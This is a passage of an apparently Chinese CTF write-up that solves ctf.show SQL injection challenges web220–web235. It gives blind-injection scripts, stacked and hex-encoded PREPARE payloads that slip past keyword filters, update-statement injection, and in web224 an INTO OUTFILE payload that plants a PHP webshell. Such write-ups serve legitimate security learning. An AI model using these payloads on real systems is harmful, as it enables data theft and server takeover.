requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://581c4aa9-8e30-4f3e-9253-216e7c43703a.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;0&#x27;, &quot;ip&quot;: f&quot;0) or if(left((select table_name from information_schema.tables where table_schema=database() limit 0, 1),&#123;index&#125;)regexp(&#x27;&#123;flag+char&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;0&#x27;, &quot;ip&quot;: f&quot;0) or if(left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1, 1),&#123;index&#125;)regexp(&#x27;&#123;flag+char&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(left((select flagaabcc from ctfshow_flagxcac),<span class="hljs-subst">&#123;index&#125;</span>)regexp(&#x27;<span class="hljs-subst">&#123;flag+char&#125;</span>&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.2</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>到这边盲注就结束了，略感疲惫。</p><h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>limit注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-title function_ invoke__">limit</span> (<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>)*<span class="hljs-variable">$limit</span>,<span class="hljs-variable">$limit</span>;<br></code></pre></td></tr></table></figure><p>放个p神的文章，可以了解一下具体内容<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法)</a>，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，这里利用procedure和analyse两个函数一齐食用，同时利用报错注入</p><p>在&#x2F;api下进行get发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?page=1&amp;<span class="hljs-built_in">limit</span>=1 procedure analyse(extractvalue(1,concat(0x7e,database())),1)<br></code></pre></td></tr></table></figure><p>得到的数据库名就是flag直接交就行</p><h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span> ctfshow_user group by <span class="hljs-variable">$username</span>;<br></code></pre></td></tr></table></figure><p>研究一下y4师傅的脚本，也是用二分法写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://fd01f201-a270-4d94-99b1-e530d1e1cdfb.challenge.ctf.show/api/&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 二分法进行查找</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment">#payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;limit 1,1&quot;</span><br>        payload = <span class="hljs-string">&quot;select flagaabc from ctfshow_flaga&quot;</span><br>        params = &#123;<br>            <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">f&quot;concat((if (ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>, sleep(0.05), 2)), 1);&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            r = requests.get(url, params=params, timeout=<span class="hljs-number">1</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>            head = mid + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>利用不断的比较大小，拼接得到flag，可能会有细小误差，手动调节就行</p><h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>无数字可以参照web185进行绕过，都是利用true进行绕过，浅浅的研究了下脚本，直接贴吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generateNum</span>(<span class="hljs-params">num</span>):<br>    res = <span class="hljs-string">&#x27;true&#x27;</span><br>    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num - <span class="hljs-number">1</span>):<br>            res += <span class="hljs-string">&quot;+true&quot;</span><br>        <span class="hljs-keyword">return</span> res<br><br>url = <span class="hljs-string">&quot;http://f1d0f6ad-cd9f-432a-885f-42f4c6f20289.challenge.ctf.show/api/&quot;</span><br>i = <span class="hljs-number">0</span><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    i = i + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 查数据库-ctfshow_flagas</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment"># 查字段-flagasabc</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;&quot;</span><br>        <span class="hljs-comment"># 查flag</span><br>        payload = <span class="hljs-string">&quot;select flagasabc from ctfshow_flagas&quot;</span><br>        params = &#123;<br>            <span class="hljs-string">&quot;u&quot;</span>: <span class="hljs-string">f&quot;if(ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;generateNum(i)&#125;</span>,<span class="hljs-subst">&#123;generateNum(<span class="hljs-number">1</span>)&#125;</span>))&gt;<span class="hljs-subst">&#123;generateNum(mid)&#125;</span>,username,&#x27;a&#x27;)&quot;</span><br>        &#125;<br>        r = requests.get(url, params=params)<br>        <span class="hljs-comment"># print(r.json()[&#x27;data&#x27;])</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;userAUTO&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        res += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>前端的登陆框架尝试sql注入绕不过去，看一下robot.txt，跟进发现php继续跟进可以重置admin的密码，重置后登陆，有文件上传，尝试了一些的文件都上传不成功，看看wp，讲的是文件类型注入，通过into写马得到flag,学一下。保存为a.bin</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">C64File &quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/orange.php&#x27;;--+<br></code></pre></td></tr></table></figure><p>C64File 是与 Commodore 64 相关的文件类型，之后闭合，写入 sql 语句这里写的是一句话的🐎</p><p>然后在orange.php里执行<code>?1=cat /flag</code>即可</p><h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="hljs-variable">$username</span>))&#123;<br>   <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br> &#125;<br></code></pre></td></tr></table></figure><p>先show看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;show tables;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;show columns from ctfshow_flagasa;%23</span><br></code></pre></td></tr></table></figure><h3 id="0x01-14"><a href="#0x01-14" class="headerlink" title="0x01"></a>0x01</h3><p>可以使用handler进行打开读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=0<span class="hljs-string">&#x27;;handler ctfshow_flagasa open;handler ctfshow_flagasa read next;#</span><br></code></pre></td></tr></table></figure><h3 id="0x02-14"><a href="#0x02-14" class="headerlink" title="0x02"></a>0x02</h3><p>用预处理的方法解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=0<span class="hljs-string">&#x27;; PREPARE 0raN9e FROM concat(&#x27;</span>selec<span class="hljs-string">&#x27;,&quot;t group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flagasa<span class="hljs-string">&#x27;&quot;); EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=0<span class="hljs-string">&#x27;; PREPARE 0raN9e FROM concat(&#x27;</span>selec<span class="hljs-string">&#x27;,&#x27;</span>t flagas from ctfshow_flagasa<span class="hljs-string">&#x27;); EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//师傅说过滤的越多越好</span><br> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="hljs-variable">$username</span>))&#123;<br>   <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br> &#125;<br></code></pre></td></tr></table></figure><p>也是预处理，但是左括号被过滤了，可以hex编码转化，简单的操作一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656c65637420646174616261736528293b;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D2763746673685F6F775F666C6167617327;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C61676173622066726F6D2063746673685F6F775F666C61676173;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>尝试用了上题的预处理翻遍没找到，看看wp吧</p><h3 id="0x01-15"><a href="#0x01-15" class="headerlink" title="0x01"></a>0x01</h3><p>没什么意义主要看0x02</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?username=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;call getFlag();</span><br></code></pre></td></tr></table></figure><h3 id="0x02-15"><a href="#0x02-15" class="headerlink" title="0x02"></a>0x02</h3><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">文章</a>，可以查看存储过程和函数的信息，SELECT  *  FROM  information_schema.Routines</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x53454C45435420202A202046524F4D2020696E666F726D6174696F6E5F736368656D612E526F7574696E6573;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D2763746673685F6F775F666C61676173616127;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C6167617362612066726F6D2063746673685F6F775F666C616761736161;EXECUTE 0raN9e;ctfsh_ow_flagasaa</span><br></code></pre></td></tr></table></figure><p>预处理转hex就行，基本同226</p><h2 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D27666C616727;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C6167617362612066726F6D20666C6167;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D27666C6167616162627827;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C616761736261732066726F6D20666C61676161626278;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><p>这些题都可以是这一个做法，就不多讲了</p><h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update ctfshow_user set pass = &#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>从这里开始是update注入，网络看一下api默认是<code>?page=1&amp;limit=10</code></p><p>可以进行post传参逐步得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=database()#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=(select flagas from flaga)#&amp;username=1</span><br></code></pre></td></tr></table></figure><h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>有了MD5加密，用括号提前闭就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=database()#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flagaa<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=(select flagass from flagaa)#&amp;username=1</span><br></code></pre></td></tr></table></figure><p>和上题基本一致</p><h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>看着和231一样，但是用上面的payload并不能成功，测试一下username这里有注入点，用时间盲注尝试看看是可以成功的，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://7426a816-01f5-4197-8302-1988fa9834c0.challenge.ctf.show/api/?page=1&amp;limit=10&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 查数据库</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment"># 查表名</span><br>        <span class="hljs-comment">#payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">&quot;select flagass233 from flag233333&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">f&quot;1&#x27; or if(ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.05),1)#&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url, data=data, timeout=<span class="hljs-number">0.9</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            head = mid + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update ctfshow_user set pass = &#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>过滤了单引号，但是可以进行转义，先上一个payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=database())%23<br></code></pre></td></tr></table></figure><p>因为\使原来的pass为<code>where username=</code>之后username就可以正常传值注入了</p><p>因为不能出现单引号，可以进行十六进制转化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=0x666c6167323361)%23<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> flagass23s3 from flag23a)%23<br></code></pre></td></tr></table></figure><h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">//过滤 or &#x27; <br></code></pre></td></tr></table></figure><p>可以进行简单的查库名，但是之后的注入尝试一下就不能成功了，information表也不能用，<a href="https://zhuanlan.zhihu.com/p/98206699">参考文章</a>，可以使用mysql里的内部系统表，innodb_table_stats和mysql.innodb_index_stats</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(table_name) from mysql.innodb_table_stats <span class="hljs-built_in">where</span> database_name=database())%23<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">password</span>=\&amp;username=,username=(<span class="hljs-keyword">select</span> b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag23a1 <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a)%<span 